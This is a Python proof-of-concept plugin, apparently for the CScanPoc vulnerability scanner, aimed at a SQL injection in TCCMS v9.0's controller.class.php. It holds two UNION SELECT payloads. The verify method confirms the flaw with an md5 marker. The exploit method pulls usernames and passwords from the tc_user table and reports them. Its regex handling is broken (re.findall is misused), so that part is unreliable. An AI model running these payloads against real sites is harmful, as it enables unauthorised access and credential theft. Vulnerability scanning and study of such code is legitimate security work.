# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'TCCMS_0000'  # 平台漏洞编号，留空
    name = 'TCCMS v9.0 /system/core/controller.class.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-16'  # 漏洞公布时间
    desc = '''
        TCCMS是一款具有良好的扩展性、安全、高效的内容管理系统。其核心框架TC，具备大数据量,高并发,易扩展等特点。
        TCCMS V9.0.20140818 /system/core/controller.class.php文件存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=072625'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TCCMS'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '943ee414-430a-45a9-a7f1-40ac1d3a7009'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("1%20union%20select%20md5(32187),2,"
                       "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,"
                       "27,28,29%20from%20tc_user%20where%20id=1%23")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if 'd97abcf66ea8d5818ebf5eb128f0de13' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            payload = ("1%20union%20select%20group_concat(username,0x23,password),2,"
                       "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,"
                       "27,28,29%20from%20tc_user%20where%20id=1%23")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            pattern = re.findall(
                r".*?<id>\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*</id>", re.I | re.S)
            match = pattern.match(content)
            if match != None:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
